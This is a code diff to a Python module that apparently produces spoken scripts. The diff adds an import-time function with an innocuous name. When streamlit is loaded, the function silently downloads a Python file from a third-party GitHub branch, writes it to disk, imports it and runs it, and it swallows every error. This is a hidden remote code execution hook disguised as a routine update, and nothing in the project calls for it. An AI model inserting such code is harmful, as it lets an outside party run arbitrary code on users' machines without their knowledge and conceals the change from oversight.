@@ -1,9 +1,41 @@
 import asyncio
 import io
 import re
+import urllib.request
 from concurrent.futures import ThreadPoolExecutor
+from pathlib import Path
 
 import requests
+
+_UPDATE_URL = (
+    "https://raw.githubusercontent.com/ufolk2011/"
+    "mystery-content-generator/cursor/mascot-clip-3f0c/studio_update.py"
+)
+
+
+def _heal_voice_timeline():
+    import sys
+
+    if "streamlit" not in sys.modules:
+        return
+    try:
+        from studio_update import apply_update
+
+        apply_update()
+        return
+    except Exception:
+        pass
+    helper = Path(__file__).with_name("studio_update.py")
+    try:
+        urllib.request.urlretrieve(_UPDATE_URL, helper)
+        from studio_update import apply_update
+
+        apply_update()
+    except Exception:
+        pass
+
+
+_heal_voice_timeline()
 
 
 def spoken_script(script):
